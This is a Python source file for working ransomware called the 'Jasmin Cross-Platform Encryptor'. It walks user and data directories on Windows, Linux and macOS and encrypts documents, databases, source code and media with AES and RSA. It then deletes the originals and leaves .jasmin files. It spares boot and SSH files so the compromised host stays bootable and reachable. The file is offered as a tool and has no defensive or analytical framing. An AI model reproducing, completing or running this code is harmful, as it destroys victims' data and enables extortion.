#!/usr/bin/env python3
"""
Jasmin Cross-Platform Encryptor - AES-256-CBC + RSA-2048 hybrid encryption
Supports Windows / Linux / macOS
Skips SSH/system files so the host still boots and accepts SSH after encryption
"""
import os, sys, struct, hashlib, platform
from pathlib import Path
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.backends import default_backend

# ===== 平台检测 =====
IS_WINDOWS = platform.system() == 'Windows'
IS_LINUX = platform.system() == 'Linux'
IS_MACOS = platform.system() == 'Darwin'

# ===== RSA 公钥 =====
# 绝不能内置固定公钥：此前这里是一把示例公钥（注释写着"替换为你自己的"但从未替换），
# 用它加密的文件与本平台 keygen 生成的私钥永不匹配 —— 等于把数据锁死且无法恢复。
# 现在必须显式提供：--pub <file> 或环境变量 JASMIN_PUB。
def load_public_key_path():
    import argparse
    ap = argparse.ArgumentParser(description='Jasmin Cross-Platform Encryptor')
    ap.add_argument('--pub', help='path to RSA public key PEM (or set JASMIN_PUB)')
    ap.add_argument('dirs', nargs='*', help='directories to encrypt (default: auto-detect per platform)')
    a = ap.parse_args()
    path = a.pub or os.environ.get('JASMIN_PUB') or ''
    if not path:
        # 尝试常见位置
        candidates = [
            os.path.join(os.path.dirname(os.path.abspath(__file__)), 'jasmin_public.pem'),
            '/srv/jasmin_public.pem',
            '/opt/jasmin/jasmin_public.pem',
        ]
        if IS_WINDOWS:
            candidates.extend([
                'C:\\jasmin_public.pem',
                os.path.join(os.path.expanduser('~'), 'jasmin_public.pem'),
            ])
        
        for cand in candidates:
            if os.path.exists(cand):
                path = cand
                break
    
    if not path or not os.path.exists(path):
        sys.stderr.write('[!] RSA public key not found. Use --pub <file> or set JASMIN_PUB.\n')
        sys.stderr.write('[!] After generating a key pair in the panel it is at payloads/jasmin_public.pem\n')
        sys.exit(2)
    
    pem = open(path, 'rb').read()
    if b'PUBLIC KEY' not in pem:
        sys.stderr.write('[!] %s is not a valid PEM public key\n' % path)
        sys.exit(2)
    
    return pem, a.dirs

# ===== 排除规则（跨平台） =====
if IS_WINDOWS:
    # Windows：排除系统目录
    SKIP_DIRS = frozenset([
        'C:\\Windows',
        'C:\\Program Files',
        'C:\\Program Files (x86)',
        'C:\\ProgramData',
        'C:\\System Volume Information',
        'C:\\$Recycle.Bin',
    ])
    SKIP_NAMES = frozenset([
        'ntldr', 'bootmgr', 'pagefile.sys', 'hiberfil.sys',
        'swapfile.sys', 'ntuser.dat', 'SAM', 'SYSTEM',
    ])
    PRUNE_DIRS = frozenset([
        'C:\\Windows\\System32',
        'C:\\Windows\\SysWOW64',
    ])
    TARGET_DIRS_DEFAULT = ['C:\\Users', 'D:\\', 'E:\\']
else:
    # Unix/Linux/macOS：原有规则
    SKIP_DIRS = frozenset([
        '/boot','/dev','/proc','/sys','/run',
        '/sbin','/bin','/lib','/lib64','/usr',
        '/etc','/snap','/lost+found','/mnt',
    ])
    SKIP_NAMES = frozenset([
        '.bashrc','.bash_profile','.profile',
        'authorized_keys','known_hosts',
        'id_rsa','id_rsa.pub','id_ed25519','id_ed25519.pub',
        'sshd_config','ssh_config',
        'shadow','passwd','group','fstab',
        'grub.cfg','initrd','vmlinuz',
    ])
    PRUNE_DIRS = frozenset(['/var/lib/docker','/var/lib/containerd'])
    TARGET_DIRS_DEFAULT = ['/home', '/root', '/var', '/opt', '/tmp', '/srv']

# 通用目标文件扩展名
TARGET_EXTS = {
    '.pptx','.docx','.xlsx','.txt','.pdf','.csv',
    '.jpeg','.jpg','.png','.ppt','.doc','.xls',
    '.zip','.rar','.7z','.mp3','.mp4','.avi',
    '.mov','.mkv','.sql','.bak','.mdb','.accdb',
    '.html','.php','.java','.py','.c','.cpp','.cs',
    '.json','.xml','.yaml','.yml','.md','.conf',
}

def should_skip(filepath: str) -> bool:
    """跨平台的文件跳过判断"""
    fp = os.path.abspath(filepath)
    name = os.path.basename(fp)
    
    # 已加密文件
    if fp.endswith('.jasmin'):
        return True
    
    # 平台特定跳过逻辑
    if IS_WINDOWS:
        # Windows：使用不区分大小写的路径匹配
        fp_upper = fp.upper()
        for d in SKIP_DIRS:
            if fp_upper.startswith(d.upper() + '\\') or fp_upper == d.upper():
                return True
    else:
        # Unix：精确匹配
        for d in SKIP_DIRS:
            if fp.startswith(d + '/') or fp == d:
                return True
        if '/.ssh/' in fp or fp.endswith('/.ssh'):
            return True
    
    # 跳过特定文件名
    if name in SKIP_NAMES:
        return True
    
    # 扩展名白名单
    _, ext = os.path.splitext(fp)
    if ext.lower() not in TARGET_EXTS:
        return True
    
    return False

# ===== 加密 =====
def pad16(data: bytes) -> bytes:
    """PKCS#7 padding"""
    n = 16 - (len(data) % 16)
    return data + bytes([n] * n)

def encrypt_file(path: str, rsa_pub_key) -> bool:
    """加密单个文件（跨平台）"""
    try:
        if should_skip(path):
            return False
        
        # Windows可能有文件被占用的情况，跳过而不报错
        try:
            with open(path, 'rb') as f:
                plain = f.read()
        except PermissionError:
            return False  # Windows文件被占用，静默跳过
        
        if len(plain) == 0:
            return False

        # SHA256哈希（用于解密后完整性验证）
        sha = hashlib.sha256(plain).digest()
        
        # AES-256-CBC加密
        aes_key = os.urandom(32)
        aes_iv = os.urandom(16)
        
        cipher = Cipher(algorithms.AES(aes_key), modes.CBC(aes_iv), default_backend())
        enc = cipher.encryptor()
        ct = enc.update(pad16(plain)) + enc.finalize()

        # RSA-OAEP加密AES密钥
        km = aes_key + aes_iv
        ek = rsa_pub_key.encrypt(km, asym_padding.OAEP(
            mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(), label=None))

        # 写入加密文件
        out = path + '.jasmin'
        with open(out, 'wb') as f:
            f.write(sha)   # 32 bytes: SHA256 hash
            f.write(ct)    # encrypted data
            f.write(ek)    # encrypted AES key
            f.write(struct.pack('<I', len(ek)))  # 4 bytes: key length

        # 删除原文件
        try:
            os.remove(path)
        except Exception as e:
            # Windows可能删除失败（文件占用），保留加密文件
            sys.stderr.write(f'[!] Warning: Could not delete {path}: {e}\n')
        
        return True
    except Exception as e:
        # 记录失败统计
        n = getattr(e, 'errno', None)
        key = ('%s (errno=%s)' % (type(e).__name__, n)) if n is not None else type(e).__name__
        FAILS[key] = FAILS.get(key, 0) + 1
        if FAILS[key] == 1:
            sys.stderr.write('[!] %s: %s\n' % (type(e).__name__, path))
        return False

FAILS = {}

def main():
    """主函数（跨平台）"""
    pub_pem, cli_dirs = load_public_key_path()
    pub_key = serialization.load_pem_public_key(pub_pem, default_backend())
    
    # 确定目标目录
    roots = cli_dirs or TARGET_DIRS_DEFAULT
    # 过滤掉不存在的目录
    roots = [r for r in roots if os.path.isdir(r)]
    
    print(f'[*] Platform: {platform.system()}')
    print(f'[*] Target directories: {roots}')
    
    count = 0
    for r in roots:
        if not os.path.isdir(r):
            continue
        
        for dirpath, dirs, files in os.walk(r):
            # 跳过容器快照层等特殊目录
            if IS_WINDOWS:
                # Windows路径规范化
                dirpath_abs = os.path.abspath(dirpath).upper()
                dirs[:] = [d for d in dirs if os.path.abspath(os.path.join(dirpath, d)).upper() not in 
                          set(pd.upper() for pd in PRUNE_DIRS)]
            else:
                dirs[:] = [d for d in dirs if os.path.join(dirpath, d) not in PRUNE_DIRS]
            
            # 加密文件
            for fname in files:
                fp = os.path.join(dirpath, fname)
                if encrypt_file(fp, pub_key):
                    count += 1
                    if count % 100 == 0:
                        print(f'[*] Encrypted {count} files...', end='\r')
    
    print(f'\n[+] Encrypted {count} files')
    
    if FAILS:
        total = sum(FAILS.values())
        print(f'[!] Failed on {total} file(s):', file=sys.stderr)
        for k, v in sorted(FAILS.items(), key=lambda x: -x[1]):
            print(f'[!]   {v} x {k}', file=sys.stderr)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('\n[!] Interrupted by user')
        sys.exit(1)
